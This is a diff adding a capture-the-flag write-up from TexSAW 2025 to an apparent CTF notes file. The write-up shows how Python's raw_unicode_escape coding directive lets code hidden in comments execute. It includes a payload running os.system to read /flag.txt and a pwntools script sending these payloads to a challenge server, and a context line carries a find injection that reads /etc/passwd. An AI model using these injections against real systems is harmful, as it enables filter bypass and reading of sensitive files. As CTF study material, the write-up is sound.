@@ -3713,6 +3713,51 @@ sth -or -exec cat /etc/passwd ; -quit
 
 ---------------------
 
+### Executing python code within comments [TexSAW 2025]
+
+-------------------
+
+- Python has a feature that can allow you specify a comment that specify a directive to interpret the code based on an encoding.This allows you to incorporate non-ASCII characters.One of these supported codecs is raw_unicode_escape, which allows you to intersperse Unicode escape sequences like \u265F for a black chess pawn Unicode character. You can also encode arbitrary ASCII characters this way, such as a newline (\u000a).Final script-:
+
+```
+# coding: raw_unicode_escape
+#\u000aimport os
+#\u000aos.system("ls -lah")
+#\u000aos.system("cat /flag.txt")
+```
+
+- Solution for Texsaw-:
+
+```
+#! /usr/bin/env python3
+from pwn import *
+svr = remote("74.207.229.59",20240)
+payloads = [b"coding: raw_unicode_escape",b"\\u000aimport os",b"\\u000aos.system(\"cat /flag.txt\")",b"\\u000aos.system(\"cat /*/*\")"]
+for index,j in enumerate(payloads):
+   svr.recv()
+   svr.sendline(str(index).encode())
+   svr.recv()
+   svr.sendline(j)
+   svr.recv()
+   if index+1 == len(payloads):
+      svr.sendline(b'N')
+      print(svr.recv().decode())
+   else:
+      svr.sendline(b'y')
+
+svr.close()
+```
+
+- Proof-:
+
+![image](https://github.com/user-attachments/assets/d151359d-29c2-4b3e-80c9-709e94a8ff5b)
+
+-------------------
+
+
+
+
+
 
 
 
